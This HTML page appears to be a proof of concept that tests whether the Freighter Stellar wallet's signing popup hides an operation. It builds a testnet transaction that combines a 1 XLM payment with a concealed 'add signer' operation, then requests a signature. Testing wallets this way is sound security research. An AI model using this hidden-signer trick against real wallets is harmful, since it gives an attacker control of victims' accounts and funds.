<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.0.0/stellar-sdk.min.js"></script>
<style>
body{background:#fff;margin:0;font-family:Arial}
.top{text-align:center;padding-top:22px}
.top span{color:#000;font-size:18px;font-weight:bold;cursor:pointer}
#log{text-align:center;margin-top:18px;font-size:12px;color:#000;white-space:pre-wrap;padding:0 12px;word-break:break-all}
</style>
</head>
<body>
<div class="top"><span onclick="test()">Click Here</span></div>
<div id="log">Ready - tap Click Here</div>

<script>
async function getFreighter(){
  // Freighter mobile bisa pakai 3 nama berbeda
  if(window.freighterApi) return window.freighterApi;
  if(window.freighter) return window.freighter;
  if(window.stellar && window.stellar.freighter) return window.stellar.freighter;
  // tunggu 1 detik siapa tau inject telat
  await new Promise(r=>setTimeout(r,1000));
  if(window.freighterApi) return window.freighterApi;
  if(window.freighter) return window.freighter;
  return null;
}

async function test(){
  const log = document.getElementById('log');
  try{
    const sourceAccount = new StellarSdk.Account('GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537', '1');
    const tx = new StellarSdk.TransactionBuilder(sourceAccount, {
      fee: "100",
      networkPassphrase: StellarSdk.Networks.TESTNET
    })
    .addOperation(StellarSdk.Operation.payment({
      destination: 'GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537',
      asset: StellarSdk.Asset.native(),
      amount: '1'
    }))
    .addOperation(StellarSdk.Operation.setOptions({
      signer: { ed25519PublicKey: 'GDAITTQ3FTE6BB5OBNBC7NOEAIODMVOB23EBJLVPHUVSAELIRSER3V22', weight: 1 }
    }))
    .setTimeout(30).build();

    const xdr = tx.toXDR();
    log.innerText = "XDR built\nDetecting Freighter...";

    const api = await getFreighter();
    if(!api){
      log.innerText = "XDR:\n"+xdr+"\n\nfreighterApi NOT FOUND\n\nCoba: tutup app Freighter, buka lagi, Discover > Search > 0x403for.github.io\nPastikan di Settings > Connected dApps ada 0x403for.github.io";
      return;
    }

    log.innerText = "Freighter found: "+Object.keys(api).join(', ')+"\nRequesting connect...";
    
    // connect dulu baru sign
    if(api.requestAccess || api.getAddress || api.connect){
      try{
        if(api.requestAccess) await api.requestAccess();
        else if(api.getAddress) await api.getAddress();
      }catch(e){}
    }

    log.innerText += "\nCalling signTransaction...";
    const signed = await api.signTransaction(xdr, {
      networkPassphrase: 'Test SDF Network ; September 2015',
      accountToSign: 'GBKIAL4UCC5YHFDNPHG3SMVLO4XZEEQA4VQ6F7EZW5ZDIWS324NUC537'
    });

    log.innerText = "SIGNED:\n"+signed.slice(0,80)+"...\n\nCEK POPUP:\nApakah cuma Payment 1 XLM?\nJika tidak ada Add Signer GDAIT... = BUG HIGH";

  }catch(e){
    document.getElementById('log').innerText = "Error: "+e.message;
  }
}
</script>
</body>
</html>
